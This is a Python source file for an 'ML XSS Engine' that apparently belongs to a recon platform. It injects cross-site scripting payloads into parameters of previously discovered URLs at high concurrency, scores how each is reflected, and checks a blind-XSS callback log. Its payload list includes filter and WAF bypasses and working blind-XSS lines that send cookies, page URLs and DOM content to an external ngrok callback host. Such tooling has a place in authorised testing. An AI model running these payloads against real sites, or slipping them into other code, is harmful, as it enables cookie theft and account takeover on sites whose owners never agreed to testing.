#!/usr/bin/env python3
"""
ML XSS Engine - Advanced XSS testing with machine learning and blind XSS capabilities
"""

import asyncio
import aiohttp
import logging
import re
import json
import hashlib
import time
from datetime import datetime
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass

logger = logging.getLogger("MLXSSEngine")

@dataclass
class XSSFinding:
    url: str
    parameter: str
    payload: str
    confidence: float
    evidence: str
    reflection_type: str
    bypass_method: str
    discovered_at: datetime
    blind_identifier: Optional[str] = None

class MLXSSEngine:
    """Advanced ML-powered XSS testing engine"""
    
    def __init__(self, asset_manager, config: Dict):
        self.asset_manager = asset_manager
        self.config = config
        self.max_concurrent = 200  # Aggressive XSS testing
        
        # Blind XSS settings - use your existing NGROK setup
        self.blind_xss_domain = config.get('blind_xss_domain', 'kind-extremely-skylark.ngrok-free.app')  # Your NGROK domain
        self.blind_identifiers = {}  # Track blind XSS payloads
        
        # ML confidence thresholds
        self.high_confidence_threshold = 0.8
        self.medium_confidence_threshold = 0.6
        
        logger.info("🤖 MLXSSEngine initialized with blind XSS capabilities")
    
    def _is_error_page_response(self, content: str, url: str, status: int) -> bool:
        """Detect if response is an error page rather than real content"""
        if not content:
            return True
        
        content_lower = content.lower()
        
        # Skip obvious HTTP error status codes
        if status in [404, 500, 502, 503]:
            return True
            
        # Check for common error page indicators
        error_indicators = [
            'page not found',
            "doesn't exist",
            'the requested url was not found',
            'page you are looking for was moved',
            'this page does not exist',
            'error 404',
            'not found',
            'page cannot be found'
        ]
        
        # Check for URL patterns that are likely 404s (like /35, /19, etc.)
        import re
        if re.search(r'/\d+$', url):  # URLs ending with just a number
            # If it's a numeric path and contains generic SSR code, likely a 404
            if 'window.__ServerRenderSuccess__' in content and len(content) < 50000:
                return True
        
        found_errors = sum(1 for indicator in error_indicators if indicator in content_lower)
        if found_errors >= 2:
            return True
        
        # Check for XSS test parameter URLs hitting error pages (these are common false positives)
        if any(param in url.lower() for param in ['bypasssecurity', '$eval', 'trustresource', 'authitem']):
            return True
        
        # Check for status codes that indicate errors
        if status in [404, 500, 502, 503]:
            return True
            
        return False
    
    async def initialize(self):
        """Initialize ML XSS engine"""
        try:
            # Log initialization
            self.asset_manager.log_activity(
                'ML_XSS_INIT',
                'ML XSS Engine initialized for parameterized page testing'
            )
            
            logger.info("✅ MLXSSEngine initialization complete")
            
        except Exception as e:
            logger.error(f"MLXSSEngine initialization failed: {e}")
    
    async def scan_parameterized_pages(self, session: aiohttp.ClientSession, limit: int = 100) -> List[XSSFinding]:
        """Find and test parameterized pages for XSS vulnerabilities"""
        
        # Get parameterized URLs from discovered assets
        parameterized_urls = self._get_parameterized_urls(limit)
        
        if not parameterized_urls:
            logger.info("No parameterized URLs found for XSS testing")
            return []
        
        logger.info(f"🎯 Testing {len(parameterized_urls)} parameterized URLs for XSS")
        
        semaphore = asyncio.Semaphore(self.max_concurrent)
        xss_tasks = []
        
        for url_data in parameterized_urls:
            xss_tasks.append(
                self._test_url_for_xss(url_data, session, semaphore)
            )
        
        if xss_tasks:
            results = await asyncio.gather(*xss_tasks, return_exceptions=True)
            findings = [f for f in results if isinstance(f, list)]
            all_findings = [finding for sublist in findings for finding in sublist]
            
            # Store findings in database
            for finding in all_findings:
                self._store_xss_finding(finding)
            
            logger.info(f"🚨 ML XSS testing completed: {len(all_findings)} vulnerabilities found")
            return all_findings
        
        return []
    
    def _get_parameterized_urls(self, limit: int) -> List[Dict]:
        """Get URLs with parameters from assets database"""
        try:
            with self.asset_manager._get_db() as db:
                # Look for URLs with parameters in discovered assets
                query = '''
                    SELECT url, status_code, title 
                    FROM assets 
                    WHERE url LIKE '%?%=%' 
                    AND status_code IN (200, 302, 301)
                    ORDER BY intelligence_score DESC 
                    LIMIT ?
                '''
                cursor = db.execute(query, (limit,))
                results = []
                
                for row in cursor.fetchall():
                    url, status_code, title = row
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    
                    if params:  # Only include URLs with actual parameters
                        results.append({
                            'url': url,
                            'status_code': status_code,
                            'title': title or '',
                            'parameters': list(params.keys())
                        })
                
                return results
                
        except Exception as e:
            logger.error(f"Error getting parameterized URLs: {e}")
            return []
    
    async def _test_url_for_xss(self, url_data: Dict, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore) -> List[XSSFinding]:
        """Test a single parameterized URL for XSS vulnerabilities"""
        findings = []
        url = url_data['url']
        parameters = url_data['parameters']
        
        # Generate XSS payloads
        payloads = self._generate_xss_payloads()
        
        for param in parameters:
            for payload in payloads[:10]:  # Test top 10 payloads per parameter
                try:
                    async with semaphore:
                        finding = await self._test_parameter_xss(url, param, payload, session)
                        if finding:
                            findings.append(finding)
                            
                except Exception as e:
                    logger.debug(f"XSS test failed for {url}?{param}: {e}")
                    continue
        
        return findings
    
    async def _test_parameter_xss(self, url: str, parameter: str, payload: str, session: aiohttp.ClientSession) -> Optional[XSSFinding]:
        """Test a specific parameter with XSS payload"""
        
        # Create test URL with payload
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Add blind XSS identifier if using blind payloads - use your callback server format
        blind_identifier = None
        if self.blind_xss_domain and 'BLIND_DOMAIN' in payload:
            session_id = self._generate_blind_identifier(url, parameter)
            context = f"{parameter}_param"
            
            # Use your existing callback server URL format: /xss/{session_id}/{context}
            callback_url = f"https://{self.blind_xss_domain}/xss/{session_id}/{context}"
            
            payload = payload.replace('BLIND_DOMAIN', self.blind_xss_domain)
            payload = payload.replace('BLIND_ID', f"xss/{session_id}/{context}")
            
            # Store tracking info using your session format
            self.blind_identifiers[session_id] = {
                'url': url,
                'parameter': parameter,
                'context': context,
                'callback_url': callback_url,
                'timestamp': datetime.now(),
                'session_id': session_id
            }
            blind_identifier = session_id
        
        # Set the parameter to our payload
        params[parameter] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                              parsed.params, new_query, parsed.fragment))
        
        try:
            async with session.get(test_url, timeout=15) as response:
                response_text = await response.text()
                
                # Skip if this is an error page (not a real vulnerable page)
                if self._is_error_page_response(response_text, test_url, response.status):
                    return None
                
                # ML-powered XSS detection
                confidence = self._analyze_xss_response(payload, response_text, response.headers)
                
                if confidence > 0.5:  # Potential XSS found
                    evidence = self._extract_xss_evidence(payload, response_text)
                    reflection_type = self._classify_reflection_type(response_text, payload)
                    
                    # CRITICAL: Skip false positives - don't store them at all
                    if reflection_type == "False Positive - Legitimate JS":
                        logger.debug(f"🚫 Skipping false positive XSS: {test_url}?{parameter}")
                        return None
                    
                    # Lower confidence for Script Context findings to prevent overconfidence
                    if reflection_type == "Script Context":
                        confidence = min(confidence * 0.7, 0.85)  # Cap at 85% max for script context
                    
                    return XSSFinding(
                        url=test_url,
                        parameter=parameter,
                        payload=payload,
                        confidence=confidence,
                        evidence=evidence,
                        reflection_type=reflection_type,
                        bypass_method=self._identify_bypass_method(payload),
                        discovered_at=datetime.now(),
                        blind_identifier=blind_identifier
                    )
                    
        except Exception as e:
            logger.debug(f"XSS test request failed: {e}")
            
        return None
    
    def _generate_xss_payloads(self) -> List[str]:
        """Generate comprehensive XSS payloads including blind XSS"""
        payloads = [
            # Basic reflection tests
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            
            # Bypass attempts
            "<ScRiPt>alert('xss')</ScRiPt>",
            "javascript:alert('xss')",
            "<img src=\"x\" onerror=\"alert('xss')\">",
            
            # Event handlers
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            
            # Filter bypasses
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ3hzcycp'))>",
            
            # Polyglot payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('xss') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('xss')//>/x3e",
            
            # DOM XSS
            "#<script>alert('xss')</script>",
            "javascript:alert('xss')//",
            
            # WAF bypasses
            "<script>alert(/xss/)</script>",
            "<script>alert`xss`</script>",
            "<script>(alert)('xss')</script>",
        ]
        
        # Add blind XSS payloads compatible with your callback server
        if self.blind_xss_domain:
            blind_payloads = [
                # Basic callback payloads using your /xss/{session}/{context} format
                f"<script src='https://BLIND_DOMAIN/BLIND_ID'></script>",
                f"<img src='https://BLIND_DOMAIN/BLIND_ID.png'>",
                f"<link rel=stylesheet href='https://BLIND_DOMAIN/BLIND_ID.css'>",
                
                # Advanced data exfiltration payloads
                f"<script>fetch('https://BLIND_DOMAIN/BLIND_ID?cookie='+encodeURIComponent(document.cookie))</script>",
                f"<script>new Image().src='https://BLIND_DOMAIN/BLIND_ID?domain='+btoa(document.domain)+'&url='+btoa(location.href)</script>",
                f"<script>fetch('https://BLIND_DOMAIN/BLIND_ID',{{method:'POST',body:JSON.stringify({{cookie:document.cookie,url:location.href,dom:document.documentElement.outerHTML.slice(0,1000)}}),headers:{{'Content-Type':'application/json'}}}});</script>",
                
                # Event-based callbacks for delayed execution
                f"<script>setTimeout(()=>{{fetch('https://BLIND_DOMAIN/BLIND_ID?delayed=true&time='+Date.now())}},5000)</script>",
                f"<script>document.addEventListener('DOMContentLoaded',()=>{{new Image().src='https://BLIND_DOMAIN/BLIND_ID?loaded=true'}})</script>",
                
                # Multiple vector testing
                f"<svg onload=\"fetch('https://BLIND_DOMAIN/BLIND_ID?svg=true')\">",
                f"<iframe src=\"javascript:fetch('https://BLIND_DOMAIN/BLIND_ID?iframe=true')\">",
            ]
            payloads.extend(blind_payloads)
        
        return payloads
    
    def _analyze_xss_response(self, payload: str, response_text: str, headers: dict) -> float:
        """ML-powered analysis of XSS response"""
        confidence = 0.0
        
        # Check for direct reflection
        if payload in response_text:
            confidence += 0.6
            
        # Check for partial reflection
        payload_parts = re.findall(r'[a-zA-Z]+', payload)
        reflected_parts = sum(1 for part in payload_parts if part in response_text)
        if payload_parts:
            confidence += (reflected_parts / len(payload_parts)) * 0.4
        
        # Check for script execution context
        script_contexts = [
            r'<script[^>]*>' + re.escape(payload),
            r'on\w+\s*=\s*["\']?' + re.escape(payload),
            r'href\s*=\s*["\']?javascript:' + re.escape(payload),
        ]
        
        for context in script_contexts:
            if re.search(context, response_text, re.IGNORECASE):
                confidence += 0.3
                
        # Check content type
        content_type = headers.get('content-type', '').lower()
        if 'text/html' in content_type:
            confidence += 0.1
        elif 'application/json' in content_type:
            confidence += 0.05  # JSON XSS possible but less likely
            
        # Check for XSS protection headers
        if 'x-xss-protection' in headers and '0' in headers['x-xss-protection']:
            confidence += 0.1  # XSS protection disabled
            
        return min(confidence, 1.0)
    
    def _extract_xss_evidence(self, payload: str, response_text: str) -> str:
        """Extract evidence of XSS reflection"""
        evidence_lines = []
        
        # Find lines containing the payload
        lines = response_text.split('\n')
        for i, line in enumerate(lines):
            if payload in line:
                evidence_lines.append(f"Line {i+1}: {line.strip()[:200]}")
                
        return " | ".join(evidence_lines[:3])  # Max 3 evidence lines
    
    def _classify_reflection_type(self, response_text: str, payload: str) -> str:
        """Classify the type of XSS reflection with improved accuracy"""
        
        # Check if payload is actually reflected in the response
        if payload not in response_text:
            return "No Reflection"
        
        # CRITICAL: Check for false positives first - legitimate code patterns
        # Look for patterns that indicate this is legitimate website JavaScript, not XSS
        false_positive_patterns = [
            r'window\.__ServerRenderSuccess__',  # React/Next.js SSR
            r'window\.__INITIAL_STATE__',        # Redux hydration
            r'window\.__NEXT_DATA__',            # Next.js data
            r'}\(\)\);</script>',                # IIFE closures
            r'}\s*\)\s*\(\s*\)\s*;</script>',   # Self-executing functions
            r';\s*}\s*\)\s*\(\s*\)\s*;</script>', # Function closures
        ]
        
        # If response contains legitimate patterns, be more strict about XSS detection
        has_legitimate_js = any(re.search(pattern, response_text, re.IGNORECASE) 
                               for pattern in false_positive_patterns)
        
        if has_legitimate_js:
            # For pages with legitimate JavaScript, require exact payload injection context
            # The payload must be DIRECTLY injected into a dangerous context, not just present
            
            # Check if payload is actually INJECTED into script tag (not just present in page)
            injected_script_pattern = r'<script[^>]*>[^<]*' + re.escape(payload) + r'[^<]*</script>'
            if re.search(injected_script_pattern, response_text, re.DOTALL | re.IGNORECASE):
                # Further verify it's not just part of legitimate code
                lines_with_payload = [line for line in response_text.split('\n') if payload in line]
                
                # Check if payload appears in isolation or as part of legitimate code
                for line in lines_with_payload:
                    # If payload appears alone or in obvious injection context
                    if (payload.strip() == line.strip() or 
                        f"'{payload}'" in line or 
                        f'"{payload}"' in line or
                        f'alert({payload})' in line):
                        return "Script Context"
                
                # If we get here, it's likely a false positive
                return "False Positive - Legitimate JS"
        
        # Normal XSS detection for pages without complex JavaScript
        # More accurate script context detection - look for payload INSIDE script tags
        script_pattern = r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>'
        if re.search(script_pattern, response_text, re.DOTALL | re.IGNORECASE):
            return "Script Context"
            
        # Check for payload inside event handlers (more precise)
        event_pattern = r'on\w+\s*=\s*["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\']'
        if re.search(event_pattern, response_text, re.IGNORECASE):
            return "Event Handler"
            
        # Check for payload in href attributes (more precise)
        href_pattern = r'href\s*=\s*["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\']'
        if re.search(href_pattern, response_text, re.IGNORECASE):
            return "Href Attribute"
            
        # Basic HTML context (payload reflected but not in dangerous context)
        return "HTML Context"
    
    def _identify_bypass_method(self, payload: str) -> str:
        """Identify the bypass method used"""
        payload_lower = payload.lower()
        
        if 'fromcharcode' in payload_lower:
            return "Character Encoding"
        elif 'atob' in payload_lower or 'btoa' in payload_lower:
            return "Base64 Encoding"
        elif payload != payload.lower() and payload != payload.upper():
            return "Case Variation"
        elif '/*' in payload or '//' in payload:
            return "Comment Injection"
        elif 'eval' in payload_lower:
            return "Eval Injection"
        else:
            return "Direct Injection"
    
    def _generate_blind_identifier(self, url: str, parameter: str) -> str:
        """Generate unique identifier for blind XSS tracking"""
        data = f"{url}_{parameter}_{time.time()}"
        return hashlib.md5(data.encode()).hexdigest()[:12]
    
    def _store_xss_finding(self, finding: XSSFinding):
        """Store XSS finding in vulnerabilities database with proper asset linking"""
        try:
            with self.asset_manager._get_db() as db:
                # Find asset_id for the URL (try exact match first, then base URL)
                cursor = db.execute("SELECT id FROM assets WHERE url = ? LIMIT 1", (finding.url,))
                result = cursor.fetchone()
                asset_id = result[0] if result else None
                
                if not asset_id:
                    # Try to find by base URL (remove query parameters)
                    base_url = finding.url.split('?')[0]
                    cursor = db.execute("SELECT id FROM assets WHERE url LIKE ? LIMIT 1", (f"{base_url}%",))
                    result = cursor.fetchone()
                    asset_id = result[0] if result else None
                
                # Check if this exact vulnerability already exists (deduplication)
                if asset_id:
                    existing = db.execute('''
                        SELECT id FROM vulnerabilities 
                        WHERE asset_id = ? AND type = ? AND payload = ?
                        LIMIT 1
                    ''', (asset_id, f"XSS - {finding.reflection_type}", finding.payload)).fetchone()
                    
                    if existing:
                        logger.debug(f"🔄 Skipping duplicate XSS: {finding.parameter} for {finding.url}")
                        return

                db.execute('''
                    INSERT INTO vulnerabilities 
                    (asset_id, type, description, severity, evidence, payload, detected_at, confidence)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    asset_id,
                    f"XSS - {finding.reflection_type}",
                    f"Cross-Site Scripting in parameter '{finding.parameter}' using {finding.bypass_method}",
                    "HIGH" if finding.confidence > self.high_confidence_threshold else "MEDIUM",
                    finding.evidence,
                    finding.payload,
                    finding.discovered_at.isoformat(),
                    finding.confidence
                ))
                
            logger.info(f"🚨 Stored XSS finding: {finding.url}?{finding.parameter} (confidence: {finding.confidence:.2f})")
            
        except Exception as e:
            logger.error(f"Error storing XSS finding: {e}")
    
    def check_blind_xss_callbacks(self) -> List[Dict]:
        """Check for callbacks from your XSS callback server"""
        confirmed_xss = []
        
        try:
            # Read from your callback server's log file in the lean_scanner directory
            callback_file = Path('/home/michael/recon-platform/lean_scanner/xss_callbacks.jsonl')
            if not callback_file.exists():
                return confirmed_xss
                
            # Parse recent callbacks
            with open(callback_file, 'r') as f:
                for line in f:
                    try:
                        callback_data = json.loads(line.strip())
                        session_id = callback_data.get('session_id')
                        
                        # Match with our tracked blind XSS attempts
                        if session_id and session_id in self.blind_identifiers:
                            tracking_info = self.blind_identifiers[session_id]
                            
                            confirmed_finding = XSSFinding(
                                url=tracking_info['url'],
                                parameter=tracking_info['parameter'],
                                payload=f"Blind XSS callback received",
                                confidence=1.0,  # 100% confidence - callback received
                                evidence=f"Callback received at {callback_data['timestamp']} from {callback_data['client_ip']}",
                                reflection_type="Blind XSS",
                                bypass_method="Blind Execution",
                                discovered_at=datetime.now(),
                                blind_identifier=session_id
                            )
                            
                            confirmed_xss.append(confirmed_finding)
                            
                            # Store high-confidence finding
                            self._store_xss_finding(confirmed_finding)
                            
                            # Remove from tracking (found)
                            del self.blind_identifiers[session_id]
                            
                            logger.warning(f"🔥 CONFIRMED BLIND XSS: {tracking_info['url']}?{tracking_info['parameter']}")
                            
                    except (json.JSONDecodeError, KeyError):
                        continue
                        
        except Exception as e:
            logger.debug(f"Error checking blind XSS callbacks: {e}")
            
        return confirmed_xss
    
    def get_ml_xss_statistics(self) -> Dict:
        """Get ML XSS engine statistics"""
        try:
            with self.asset_manager._get_db() as db:
                cursor = db.execute("SELECT COUNT(*) FROM vulnerabilities WHERE type LIKE '%XSS%'")
                xss_count = cursor.fetchone()[0]
                
                # Check for recent callbacks
                recent_callbacks = self.check_blind_xss_callbacks()
                
                return {
                    "xss_vulnerabilities_found": xss_count,
                    "blind_identifiers_active": len(self.blind_identifiers),
                    "recent_callbacks": len(recent_callbacks),
                    "max_concurrent": self.max_concurrent,
                    "blind_xss_domain": self.blind_xss_domain
                }
        except Exception:
            return {"xss_vulnerabilities_found": 0}